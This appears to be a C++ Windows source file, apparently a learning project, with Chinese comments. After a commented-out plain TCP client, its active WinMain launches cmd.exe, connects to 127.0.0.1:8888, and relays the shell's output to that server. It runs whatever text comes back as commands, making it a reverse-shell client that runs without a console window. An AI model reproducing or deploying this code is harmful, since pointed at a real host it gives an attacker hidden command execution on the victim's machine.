//#include<WINSOCK2.H>  
//#include<STDIO.H>  
//#include<iostream>  
//#include<string>  
//using namespace std;
//#pragma comment(lib, "ws2_32.lib")  
//
//int main()
//{
//	WORD sockVersion = MAKEWORD(2, 2);
//	WSADATA data;
//	if (WSAStartup(sockVersion, &data) != 0)
//	{
//		return 0;
//	}
//	while (true) {
//		SOCKET sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
//		if (sclient == INVALID_SOCKET)
//		{
//			printf("invalid socket!");
//			return 0;
//		}
//
//		sockaddr_in serAddr;
//		serAddr.sin_family = AF_INET;
//		serAddr.sin_port = htons(8888);
//		serAddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
//		if (connect(sclient, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
//		{  //连接失败   
//			printf("connect error !");
//			closesocket(sclient);
//			return 0;
//		}
//
//		string data;
//		getline(cin, data);
//		const char * sendData;
//		sendData = data.c_str();   //string转const char*   
//								   //char * sendData = "你好，TCP服务端，我是客户端\n";  
//		send(sclient, sendData, strlen(sendData), 0);
//		//send()用来将数据由指定的socket传给对方主机  
//		//int send(int s, const void * msg, int len, unsigned int flags)  
//		//s为已建立好连接的socket，msg指向数据内容，len则为数据长度，参数flags一般设0  
//		//成功则返回实际传送出去的字符数，失败返回-1，错误原因存于error   
//
//		char recData[255];
//		int ret = recv(sclient, recData, 255, 0);
//		if (ret>0) {
//			recData[ret] = 0x00;
//			printf(recData);
//		}
//		closesocket(sclient);
//	}
//
//
//	WSACleanup();
//	return 0;
//
//}
#pragma comment(lib, "ws2_32.lib")  
#include<WinSock2.h>
#include"MySocket.h"
#include<string>
#include<iostream>
#include"Shell.h"
int _stdcall WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow
	) {
	MySocket s1;
	s1.SocketInit("127.0.0.1", 8888);
	string test;
	Shell shell;
	shell.RunProcess(TEXT("C:\\Windows\\System32\\cmd.exe"));
	cout << "Client" << endl;
	int rec = 0;
	while (true) {
		shell.GetOutput(">", 2000, test);
		s1.SocketSend(test);
		s1.SocketRecv(test);
		cout << test << endl;
		if (test == "000") {
			break;
		}
		shell.SetInput(test);
		
		
		
	}
	
	
}